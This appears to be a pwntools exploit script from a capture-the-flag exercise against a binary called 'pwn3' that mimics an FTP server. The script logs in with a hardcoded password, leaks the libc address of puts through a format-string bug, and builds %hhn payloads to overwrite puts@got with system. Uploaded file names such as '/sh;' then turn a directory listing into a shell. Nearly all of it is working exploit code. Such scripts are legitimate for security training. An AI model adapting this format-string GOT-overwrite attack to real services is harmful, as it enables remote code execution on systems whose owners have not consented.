from pwn import *
context.log_level = "debug"
p = process("./pwn3")
#p = connect("192.168.12.153",20000)
e = ELF("./pwn3")
puts_got = e.got['puts']
print "puts_got: "+hex(puts_got)

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
print "system_offset: "+hex(system_offset)
print "puts_offset: "+hex(libc.symbols['puts'])
p.recvuntil("Rainism):")
p.sendline("rxraclhm")
p.recvuntil("ftp>")

def get(p,name):
	p.sendline("get")
	p.recvuntil("to get:")
	p.sendline(name)
	return p.recv()

def put(p,name,content):
	p.sendline("put")
	p.recvuntil("upload:")
	p.sendline(name)
	p.recvuntil("content:")
	p.sendline(content)
	return p.recv()


put(p,"a",p32(puts_got)+"%7$s")
get(p,"a")
pause()
'''
def leak_puts(p):
	put(p,"/sh;",p32(puts_got)+"%7$s")
	res = get(p,"/sh;")

	puts_addr = u32(res[4:8])	
	print "puts_addr :"+hex(puts_addr)
	return puts_addr

#0x804a028 <puts@got.plt>:	0xf7638880
puts_addr = leak_puts(p)
system_addr = puts_addr - puts_offset + system_offset

print "system_addr: "+hex(system_addr)
#gdb.attach(p)

print "\n"
print "puts_got <= system_addr"
payload_zero = p32(puts_got)+"%"+str((system_addr & 0xff)-4)+"c%7$hhn"

print payload_zero
payload1 = p32(puts_got+1)+'%'+str((system_addr>>8 & 0xff)-4)+"c%7$hhn"
print payload1
payload2 = p32(puts_got+2)+"%"+str((system_addr>>16 & 0xff)-4) +"c%7$hhn"
print payload2

put(p,"n",payload_zero)
get(p,"n")
put(p,"i",payload1)
get(p,'i')
put(p,"/b",payload2)
get(p,'/b')
#gdb.attach(p)
p.sendline("dir")
#gdb.attach(p)
p.interactive()

'''
